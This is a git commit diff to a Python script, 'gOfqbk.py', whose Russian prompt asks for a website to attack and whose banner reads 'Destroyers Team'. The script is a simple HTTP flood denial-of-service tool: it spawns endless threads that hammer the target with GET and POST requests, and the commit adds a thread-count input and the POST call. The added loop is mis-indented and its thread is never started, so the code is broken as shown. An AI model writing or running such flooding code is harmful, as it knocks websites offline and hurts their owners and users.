c1d9eb68962d7a3d91602e236a5adcb2004e1d84
nik-68 <106348996+nik-68@users.noreply.github.com>
2022-07-25 03:03:31 +0300

    Update gOfqbk.py

--- gOfqbk.py
+++ gOfqbk.py
@@ -2,15 +2,20 @@ import threading
 import requests
 import random	# For Random source port
 import time
+from threading import Thread
 
 print("🅳🅴🆂🆃🆁🅾🆈🅴🆁🆂 🆃🅴🅰🅼")
 
 targ = input("Введите ссылку на сайт для атаки: ")
+thrnom = input('Threads: ')
 
-def dos():
+def ddos():
  while True:
-  requests.get(targ)
+  spam = requests.post(targ)
+  spam2 = requests.get(targ)
   print("[+] Заход на сайт выполнен!")
-  
+ for i in range(int(thrnom)):
+ thr = Thread(target = ddos) 
 while True:
- threading.Thread(target=dos).start()
+ threading.Thread(target=ddos).start()
+ print('DDOS is running...')
